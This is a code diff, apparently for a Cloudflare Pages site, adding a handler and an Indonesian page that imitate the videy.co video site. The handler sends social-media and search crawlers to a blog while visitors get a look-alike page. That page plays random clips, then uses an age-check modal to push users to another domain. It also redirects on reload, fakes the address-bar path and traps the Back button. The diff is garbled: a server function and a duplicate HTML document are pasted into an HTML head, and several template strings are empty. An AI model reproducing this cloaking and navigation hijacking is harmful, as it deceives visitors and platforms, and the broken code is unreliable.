@@ -5,6 +5,483 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Videy - Tonton & Bagikan Video</title>
 
+export async function onRequest(context) {
+  const { request, env } = context;
+  const url = new URL(request.url);
+
+  // --- Route 1: Root redirect (dipertahankan) ---
+  if (url.pathname === "/") {
+    return Response.redirect("https://videy.co/", 302);
+  }
+
+  // --- Route 2: Generator endpoint (dipertahankan) ---
+  if (url.pathname === "/g/") {
+    const targetUrl = url.searchParams.get("url");
+    if (!targetUrl) {
+      return new Response("Parameter 'url' tidak ditemukan.", { status: 400 });
+    }
+
+    const validPrefix = "https://dsvplay.com/e/";
+    if (!targetUrl.startsWith(validPrefix)) {
+      return new Response(
+        "Format URL tidak valid. Harus dimulai dengan 'https://dsvplay.com/e/'.",
+        { status: 400 }
+      );
+    }
+
+    const videoId = targetUrl.substring(validPrefix.length);
+    if (!videoId) {
+      return new Response("ID tidak dapat diekstrak dari URL.", { status: 400 });
+    }
+
+    const destinationUrl = new URL(`/v/?id=${encodeURIComponent(videoId)}`, url);
+    return Response.redirect(destinationUrl.toString(), 302);
+  }
+
+  // --- Route 3: Video page handler (disesuaikan) ---
+  if (url.pathname === "/v/") {
+    // Cek apakah ini permintaan dari reverse proxy kita dengan header khusus
+    const isProxyRequest = request.headers.get("X-Proxy-Request") === "true";
+
+    if (isProxyRequest) {
+      // Jika ya, langsung sajikan konten HTML tanpa redirect
+      const assetUrl = new URL('/videy.html', url);
+      return env.ASSETS.fetch(assetUrl);
+    }
+
+    // Jika bukan dari proxy, lanjutkan dengan logika redirect
+    const ua = request.headers.get("user-agent") || "";
+    const BOT_PATTERNS = [
+      /facebookexternalhit/i, /Facebot/i, /Twitterbot/i, /X-Twitterbot/i,
+      /Slackbot-LinkExpanding/i, /WhatsApp/i, /TelegramBot/i,
+      /LinkedInBot/i, /Discordbot/i, /redditbot/i, /Pinterest/i,
+      /Googlebot/i, /bingbot/i, /Applebot/i
+    ];
+
+    if (BOT_PATTERNS.some((re) => re.test(ua)) || request.method === "HEAD") {
+      return Response.redirect("https://maneh.blog/", 302);
+    }
+
+    // Untuk pengguna biasa, sajikan videy.html. Skrip di dalamnya akan menangani logika reload.
+    const assetUrl = new URL('/videy.html', url);
+    return env.ASSETS.fetch(assetUrl);
+  }
+
+  // --- Fallback: biarkan Pages serve asset lain seperti biasa ---
+  return env.ASSETS.fetch(request);
+}
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Videy - Tonton & Bagikan Video</title>
+
+  <!-- Redirect on page reload -->
+  <script>
+    const navEntries = window.performance.getEntriesByType("navigation");
+    if (navEntries.length > 0 && navEntries[0].type === 'reload') {
+      window.location.replace("https://maneh.blog/p/perang-dingin-digital-keamanan-siber");
+    }
+  </script>
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Font Awesome (opsional) -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+
+  <!-- Font & Helpers -->
+  <style>
+    @import  url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+    body { font-family: 'Inter', sans-serif; }
+    .fade-transition { transition: opacity 0.5s ease-in-out; }
+
+    /* Frame video fleksibel: pertahankan rasio asli */
+    .video-frame{
+      background:#000; display:flex; align-items:center; justify-content:center;
+      width:100%; max-width:1024px; margin:0 auto; border-radius:.5rem; overflow:hidden;
+    }
+    .video-el{
+      display:block; max-width:100%; max-height:80vh; width:100%; height:auto; object-fit:contain;
+    }
+    .video-frame.portrait .video-el{ width:auto; height:80vh; max-height:80vh; max-width:100%; }
+
+    /* Saat modal terbuka: kunci scroll */
+    .no-scroll{ overflow:hidden; }
+
+  </style>
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, nofollow">
+</head>
+<body class="bg-white text-gray-800">
+
+  <!-- Header -->
+  <header class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
+    <div class="flex items-center space-x-1">
+      <span class="font-extrabold text-2xl leading-none select-none">videy</span>
+    </div>
+    <nav class="flex items-center space-x-6">
+      <button class="bg-gray-200 rounded-full px-4 py-1 text-black font-semibold text-sm" type="button">Upload</button>
+      <a class="text-black text-sm" href="#">Advertise</a>
+    </nav>
+  </header>
+
+  <!-- Main Video -->
+  <main class="px-4 pt-6 max-w-4xl mx-auto">
+    <div id="videoContainer" class="video-frame fade-transition opacity-100">
+      <video id="mainVideo" class="video-el" muted playsinline controls preload="metadata">
+        <source id="videoSource" src="" type="video/mp4">
+        Browser Anda tidak mendukung video tag.
+      </video>
+    </div>
+  </main>
+
+  <!-- Artikel -->
+  <section id="allArticles" class="max-w-4xl mx-auto px-4 pb-10">
+    <h2 class="text-2xl font-bold mb-6 text-center">Videy My Video</h2>
+    <div id="articlesContainer"></div>
+  </section>
+
+  <!-- Modal Verifikasi Usia -->
+  <div id="ageModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/60 p-4"
+       role="dialog" aria-modal="true" aria-labelledby="ageTitle" aria-describedby="ageDesc">
+    <div class="w-full max-w-md rounded-2xl bg-white shadow-xl">
+      <div class="px-6 pt-6 pb-4">
+        <h3 id="ageTitle" class="text-xl font-bold mb-2">videy.co</h3>
+        <p id="ageDesc" class="text-gray-700">
+          Harap konfirmasikan bahwa Anda memenuhi persyaratan usia minimum 18 tahun.
+        </p>
+      </div>
+      <div class="flex items-center justify-end gap-3 px-6 pb-6">
+        <button id="ageCancelBtn" class="px-4 py-2 rounded-full border border-gray-300 text-gray-500 font-semibold">BATALKAN</button>
+        <button id="ageOkBtn" class="px-5 py-2 rounded-full bg-black text-white font-semibold">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Script -->
+  <script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.11/dist/purify.min.js"></script>
+  <script>
+    // =========================
+    // KONFIGURASI
+    // =========================
+    const BLOG_URL = "https://maneh.blog"; // Ganti dengan URL Cloudflare Pages Anda yang benar
+
+    // "always"      -> selalu tampil tiap pageview/playback
+    // "per_session" -> sekali per sesi browser
+    // "per_30d"     -> sekali per 30 hari
+    const POPUP_MODE = "always";
+
+    // ====== Daftar video random ====== (dipertahankan)
+    const videoList = [
+      "https://cdn.videy.co/3ttnEjDt1.mp4",
+      "https://cdn.videy.co/ej5F0jlE1.mp4",
+      "https://cdn.videy.co/EnPkpEMC1.mp4",
+      "https://cdn.videy.co/ksnCnJjL1.mp4",
+      "https://cdn.videy.co/rNW7sJf91.mp4",
+      "https://cdn.videy.co/EGKmje6t1.mp4",
+      "https://cdn.videy.co/HWtQMgyI1.mp4",
+      "https://cdn.videy.co/smMnJo6V1.mp4",
+      "https://cdn.videy.co/JjTLcUvw1.mp4",
+      "https://cdn.videy.co/OOyY3kAd1.mp4",
+      "https://cdn.videy.co/tczq8Hrx1.mp4",
+      "https://cdn.videy.co/byBBSLDt1.mp4",
+      "https://cdn.videy.co/DuYheKHq1.mp4",
+      "https://cdn.videy.co/dAWABY8e1.mp4",
+      "https://cdn.videy.co/d94lkIFM1.mp4",
+      "https://cdn.videy.co/HgA4F2ZI1.mp4",
+      "https://cdn.videy.co/tXyBPxNo1.mp4",
+      "https://cdn.videy.co/rRNYspvs1.mp4",
+      "https://cdn.videy.co/8UrUtXYe1.mp4",
+      "https://cdn.videy.co/zr7nTk7N1.mp4",
+      "https://cdn.videy.co/5wZVrhhp1.mp4",
+      "https://cdn.videy.co/EBmu7RB01.mp4",
+      "https://cdn.videy.co/AT0XmTal1.mp4",
+      "https://cdn.videy.co/nkP8efMM1.mp4",
+      "https://cdn.videy.co/sXExUvm81.mp4",
+      "https://cdn.videy.co/o1Bv6JtU1.mp4",
+      "https://cdn.videy.co/B6heQR901.mp4",
+      "https://cdn.videy.co/TJnAn5I51.mp4",
+      "https://cdn.videy.co/gDRdNSB71.mp4",
+      "https://cdn.videy.co/TA6Q6DY41.mp4",
+      "https://cdn.videy.co/hICbGEZS1.mp4",
+      "https://cdn.videy.co/3sYxEEr71.mp4",
+      "https://cdn.videy.co/vkowCTUM1.mp4",
+      "https://cdn.videy.co/ZnQSwtYa1.mp4",
+      "https://cdn.videy.co/bCHom5kN1.mp4",
+      "https://cdn.videy.co/eTXeLhOf1.mp4",
+      "https://cdn.videy.co/yfGA1LxP1.mp4",
+      "https://cdn.videy.co/tLfrjMFv1.mp4",
+      "https://cdn.videy.co/gloEgJ5z1.mp4",
+      "https://cdn.videy.co/KxXApVT81.mp4",
+      "https://cdn.videy.co/uhdyCgGD1.mp4",
+      "https://cdn.videy.co/cXFSH96r1.mp4",
+      "https://cdn.videy.co/6Z410HbQ1.mp4",
+      "https://cdn.videy.co/w2oyDZf71.mp4",
+      "https://cdn.videy.co/HtRJF3YP1.mp4",
+      "https://cdn.videy.co/OabKyFrH1.mp4",
+      "https://cdn.videy.co/jbIEsuP51.mp4",
+      "https://cdn.videy.co/My0O2PVZ1.mp4",
+      "https://cdn.videy.co/AIv3cXoe1.mp4",
+      "https://cdn.videy.co/jnGtqXhP1.mp4",
+      "https://cdn.videy.co/CPHBnVYp1.mp4",
+      "https://cdn.videy.co/FtLk0Zjm2.mp4",
+      "https://cdn.videy.co/bkLjZd7N1.mp4",
+      "https://cdn.videy.co/MsVrKD3f1.mp4",
+      "https://cdn.videy.co/VW5WBk641.mp4",
+      "https://cdn.videy.co/2SNcektp1.mp4",
+      "https://cdn.videy.co/43IbHqrp1.mp4",
+      "https://cdn.videy.co/69SHf7ca1.mp4",
+      "https://cdn.videy.co/YXS1XP3E1.mp4",
+      "https://cdn.videy.co/3JRzPzff1.mp4",
+      "https://cdn.videy.co/5dteDQjh1.mp4",
+      "https://cdn.videy.co/wC8e9Tvr1.mp4",
+      "https://cdn.videy.co/dNIQc0rX1.mp4",
+      "https://cdn.videy.co/Vm9Slx0P1.mp4",
+      "https://cdn.videy.co/Fq3NnQL81.mp4",
+      "https://cdn.videy.co/yUoimOF71.mp4",
+      "https://cdn.videy.co/sPRQtj021.mp4",
+      "https://cdn.videy.co/oiXLfT0X1.mp4",
+      "https://cdn.videy.co/ZhwALkTD1.mp4",
+      "https://cdn.videy.co/PHWxZstk1.mp4",
+      "https://cdn.videy.co/KAAAzVUQ1.mp4",
+      "https://cdn.videy.co/5JdNXp0k1.mp4",
+      "https://cdn.videy.co/gEq1wcn51.mp4",
+      "https://cdn.videy.co/kXPHGVMc1.mp4",
+      "https://cdn.videy.co/5PVtTlf21.mp4",
+      "https://cdn.videy.co/JJfxwu8h1.mp4",
+      "https://cdn.videy.co/dICKQUoW1.mp4",
+      "https://cdn.videy.co/lG4v6zim1.mp4",
+      "https://cdn.videy.co/kgb8cmWL1.mp4",
+      "https://cdn.videy.co/3ju98jY01.mp4",
+      "https://cdn.videy.co/NVAuuEF31.mp4",
+      "https://cdn.videy.co/pPHyfC5o1.mp4",
+      "https://cdn.videy.co/UefiwezW1.mp4",
+      "https://cdn.videy.co/s46QV2Ir1.mp4",
+      "https://cdn.videy.co/SEtFZIzk1.mp4",
+      "https://cdn.videy.co/Uc3lpPQg1.mp4",
+      "https://cdn.videy.co/gUc2D6sV1.mp4",
+      "https://cdn.videy.co/5Wed9jP71.mp4",
+      "https://cdn.videy.co/hcEApFKh1.mp4",
+      "https://cdn.videy.co/3LQtaOuk1.mp4",
+      "https://cdn.videy.co/iNMbHsm91.mp4",
+      "https://cdn.videy.co/wPSNktJ31.mp4",
+      "https://cdn.videy.co/5ZuxRNxh1.mp4",
+      "https://cdn.videy.co/vfN2tTnw1.mp4",
+      "https://cdn.videy.co/SUx4iqO01.mp4",
+      "https://cdn.videy.co/SvSnNs991.mp4",
+      "https://cdn.videy.co/K8R2GLUa1.mp4"
+    ];
+    const pickRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
+
+    // ====== Storage util (dipertahankan) ======
+    const AGE_KEY = "ageConfirmedAt";
+    const AGE_TTL_MS = 30 * 24 * 60 * 60 * 1000;
+
+    function getApexDomain(){
+      const parts = location.hostname.split('.');
+      for(let i=parts.length-2;i>=0;i--){
+        const d='.'+parts.slice(i).join('.');
+        document.cookie=`__apextest=1;path=/;domain=${d}`;
+        const ok=document.cookie.includes('__apextest=1');
+        document.cookie=`__apextest=;path=/;domain=;expires=Thu, 01 Jan 1970 00:00:00 GMT`;
+        if(ok) return d;
+      }
+      return location.hostname;
+    }
+    const COOKIE_DOMAIN = getApexDomain();
+    function setCookie(name,value,days){
+      const expires=new Date(Date.now()+days*864e5).toUTCString();
+      document.cookie=`${encodeURIComponent(name)}=${encodeURIComponent(value)};path=/;domain=;expires=;SameSite=Lax`;
+    }
+    function getCookie(name){
+      return document.cookie.split('; ').find(r=>r.startsWith(encodeURIComponent(name)+'='))?.split('=')[1];
+    }
+
+    function isAgeConfirmed(){
+      if(POPUP_MODE==="always") return false;
+      if(POPUP_MODE==="per_session") return sessionStorage.getItem(AGE_KEY)==="1";
+      const tsLS=Number(localStorage.getItem(AGE_KEY)||0);
+      const okLS=tsLS && (Date.now()-tsLS)<AGE_TTL_MS;
+      const tsCK=Number(getCookie(AGE_KEY)||0);
+      const okCK=tsCK && (Date.now()-tsCK)<AGE_TTL_MS;
+      return okLS||okCK;
+    }
+    function setAgeConfirmed(){
+      if(POPUP_MODE==="per_session"){ try{sessionStorage.setItem(AGE_KEY,"1");}catch{} return; }
+      if(POPUP_MODE==="per_30d"){ const now=Date.now().toString(); try{localStorage.setItem(AGE_KEY,now);}catch{} setCookie(AGE_KEY,now,30); }
+      // "always": tidak menyimpan apa-apa
+    }
+
+    // ====== Modal helpers ======
+    function showAgeModal(){
+      document.body.classList.add('no-scroll');
+      const m=document.getElementById('ageModal'); m.classList.remove('hidden'); m.classList.add('flex');
+      setTimeout(()=>document.getElementById('ageOkBtn').focus(),0);
+    }
+    function hideAgeModal(){
+      document.body.classList.remove('no-scroll');
+      const m=document.getElementById('ageModal'); m.classList.add('hidden'); m.classList.remove('flex');
+    }
+
+    // ====== Layout video sesuai rasio ======
+    function applyVideoLayout(videoEl){
+      const c=document.getElementById("videoContainer");
+      c.classList.toggle('portrait', videoEl.videoHeight > videoEl.videoWidth);
+    }
+
+    // ====== Setup video + popup @ 15 detik ======
+    function setupVideo(){
+      const video=document.getElementById("mainVideo");
+      const source=document.getElementById("videoSource");
+
+      // Ambil id dari URL jika ada
+      const urlParams = new URLSearchParams(window.location.search);
+      const videoId = urlParams.get('id');
+
+      if (videoId) {
+        source.src = `https://cdn.videy.co/.mp4`;
+      } else {
+        source.src = pickRandomVideo();
+      }
+
+      video.load();
+
+      const tryPlay = () => { video.muted = true; video.play().catch(() => {}); };
+
+      let isModalTriggered = false;
+      let popupThreshold = 15; // detik
+      const stopThreshold = 15; // detik
+
+      const onMeta=()=>{
+        applyVideoLayout(video);
+        if (isFinite(video.duration) && video.duration > 0 && video.duration < popupThreshold) {
+          popupThreshold = Math.max(1, video.duration * 0.9);
+        }
+        tryPlay();
+      };
+
+      const handleTimeUpdate = () => {
+        const currentTime = video.currentTime;
+        if (!isModalTriggered && !isAgeConfirmed() && currentTime >= popupThreshold) {
+          isModalTriggered = true;
+          video.pause();
+          showAgeModal();
+        }
+        if (currentTime >= stopThreshold) {
+          video.pause();
+          video.removeEventListener("timeupdate", handleTimeUpdate);
+        }
+      };
+
+      if (video.readyState >= 1) onMeta();
+      else video.addEventListener("loadedmetadata", onMeta, { once: true });
+
+      video.addEventListener("timeupdate", handleTimeUpdate);
+      window.addEventListener('resize', ()=>applyVideoLayout(video));
+
+      // Aksi modal → arahkan jika ada ID
+      const modalRedirectHandler = () => {
+        const videoIdNow = new URLSearchParams(window.location.search).get('id');
+        if (videoIdNow) {
+          window.location.href = `https://dsvplay.com/e/`;
+        }
+      };
+      document.getElementById('ageOkBtn').addEventListener('click', modalRedirectHandler);
+      document.getElementById('ageCancelBtn').addEventListener('click', modalRedirectHandler);
+    }
+
+    // ====== Artikel ======
+    async function loadAllArticles() {
+      const container = document.getElementById("articlesContainer");
+      if (!container) return;
+
+      const getArticlesOnline = async () => {
+        const scriptUrl = `/js/data.js?v=${new Date().getTime()}`;
+        const response = await fetch(scriptUrl, { cache: 'no-store' });
+        if (!response.ok) {
+          throw new Error(`Gagal mengambil data (HTTP Status: ${response.status})`);
+        }
+        const scriptContent = await response.text();
+
+        const startIndex = scriptContent.indexOf('[');
+        const endIndex = scriptContent.lastIndexOf(']');
+        if (startIndex === -1 || endIndex === -1 || endIndex < startIndex) {
+          throw new Error('Format data artikel tidak valid: Array JSON tidak ditemukan.');
+        }
+
+        const jsonString = scriptContent.substring(startIndex, endIndex + 1);
+        try {
+          const articles = new Function(`return `)();
+          return articles;
+        } catch {
+          throw new Error('Format data artikel yang diterima tidak valid.');
+        }
+      };
+
+      try {
+        const articles = await getArticlesOnline();
+        if (!Array.isArray(articles) || articles.length === 0) {
+          throw new Error("Data artikel kosong atau tidak valid.");
+        }
+
+        let currentIndex = -1;
+
+        function drawRandomArticleContent() {
+          let newIndex;
+          do {
+            newIndex = Math.floor(Math.random() * articles.length);
+          } while (articles.length > 1 && newIndex === currentIndex);
+
+          currentIndex = newIndex;
+          const article = articles[currentIndex];
+          const cleanContent = DOMPurify.sanitize(article.html);
+
+          container.innerHTML = `
+            <div class="bg-white border border-gray-200 shadow-sm rounded-xl p-6">
+              <h3 class="text-2xl font-bold text-gray-900 mb-4">${article.title}</h3>
+              <div class="prose max-w-none text-gray-700 text-justify"></div>
+            </div>
+          `;
+        }
+
+        drawRandomArticleContent();
+        setInterval(drawRandomArticleContent, 30000);
+      } catch (error) {
+        container.innerHTML = `<div class="text-center text-red-700 p-6 bg-red-50 border border-red-200 rounded-lg" role="alert">
+          <h4 class="font-bold">Gagal Memuat Artikel</h4>
+          <p class="text-sm mt-1">${error.message}</p>
+          <p class="text-xs text-gray-500 mt-3">Ini bisa terjadi karena masalah <strong>CORS</strong>. Pastikan server <code></code> mengizinkan request dari domain ini.</p>
+        </div>`;
+      }
+    }
+
+    // ====== Init ======
+    document.addEventListener('DOMContentLoaded', ()=>{
+      // Ganti URL di address bar tanpa memuat ulang halaman.
+      history.replaceState(null, '', '/p/perang-dingin-digital-keamanan-siber');
+
+      setupVideo();
+      loadAllArticles();
+
+      // Tahan tombol Back (dipertahankan)
+      history.pushState(null, null, document.URL);
+      window.addEventListener('popstate', () => {
+        window.location.href = window.location.href;
+      });
+    });
+  </script>
+</body>
+</html>
+  <!-- Redirect on page reload -->
+  <script>
+    const navEntries = window.performance.getEntriesByType("navigation");
+    if (navEntries.length > 0 && navEntries[0].type === 'reload') {
+      window.location.replace("https://maneh.blog/p/perang-dingin-digital-keamanan-siber");
+    }
+  </script>
+
   <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
 
@@ -379,6 +856,9 @@
 
     // ====== Init ======
     document.addEventListener('DOMContentLoaded', ()=>{
+      // Ganti URL di address bar tanpa memuat ulang halaman.
+      history.replaceState(null, '', '/p/perang-dingin-digital-keamanan-siber');
+
       setupVideo();
       loadAllArticles();
 
